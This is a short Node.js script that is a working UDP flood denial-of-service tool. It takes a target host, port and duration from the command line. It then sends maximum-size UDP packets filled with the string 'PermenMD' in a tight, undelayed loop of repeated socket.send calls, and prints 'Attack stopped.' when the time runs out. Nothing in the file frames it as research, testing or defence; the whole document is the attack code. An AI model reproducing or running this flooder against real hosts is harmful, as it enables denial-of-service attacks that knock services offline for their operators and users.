const dgram = require('dgram');

const target = process.argv[2];
const port = process.argv[3];
const duration = process.argv[4]
function generatePayload(size) {
    let payload = Buffer.alloc(size);
    payload.fill('PermenMD');
    return payload;
}

const payload = generatePayload(65507);

setInterval(() => {
    const socket = dgram.createSocket('udp4');
    for (let p = 0; p < 50; p++) {
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
socket.send(payload, 0, payload.length, port, target);
    }
    socket.send(payload, 0, payload.length, port, target, (err) => {
        if (err) {
            console.error('Error sending message:', err);
        }
        socket.close();
    });
});

console.clear();
console.log(``);
    setTimeout(() => {
        console.log('Attack stopped.');
        process.exit(0);
    }, duration * 1000);